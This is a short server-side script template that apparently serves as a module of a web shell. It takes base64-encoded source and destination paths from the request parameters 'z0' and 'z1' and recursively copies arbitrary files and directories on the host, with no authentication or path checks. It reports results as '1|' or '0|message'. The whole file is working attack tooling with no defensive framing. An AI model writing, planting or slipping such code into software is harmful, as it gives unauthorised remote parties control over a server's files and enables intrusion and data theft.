<%
(function() {
    response.setContentType("text/html");
    response.setCharacterEncoding("UTF-8");

    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;
    var StandardCopyOption = java.nio.file.StandardCopyOption;
    var File = java.io.File;

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    function do_copy(srcPath, destPath) {
        try {
            var src = Paths.get(srcPath);
            var dest = Paths.get(destPath);

            if (Files.isDirectory(src)) {
                if (!Files.exists(dest)) {
                    Files.createDirectories(dest);
                }

                var stream = Files.list(src);
                var iterator = stream.iterator();
                
                while (iterator.hasNext()) {
                    var file = iterator.next();
                    var fileName = file.getFileName().toString();
                    
                    if (!do_copy(file.toString(), dest.resolve(fileName).toString())) {
                        stream.close();
                        return false;
                    }
                }
                stream.close();
                return true;
            } else {
                var parent = dest.getParent();
                if (parent != null && !Files.exists(parent)) {
                    Files.createDirectories(parent);
                }
                
                Files.copy(src, dest, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.COPY_ATTRIBUTES);
                return true;
            }
        } catch (e) {
            // do something
            return false;
        }
    }

    var src_path = base64_decode(request.getParameter("z0"));
    var dst_path = base64_decode(request.getParameter("z1"));

    if (!src_path || !dst_path) {
        output("0|Missing parameters.");
        return;
    }

    function main() {
        var srcFile = new File(src_path);
        var dstFile = new File(dst_path);

        if (!srcFile.exists()) {
            output('0|Source does not exist.');
            return;
        }

        if (!dstFile.exists()) {
            if (do_copy(src_path, dst_path)) {
                output('1|');
            } else {
                output('0|Error.');
            }
        } else {
            output('0|Destination already exists.');
        }
    }

    main();
})();
%>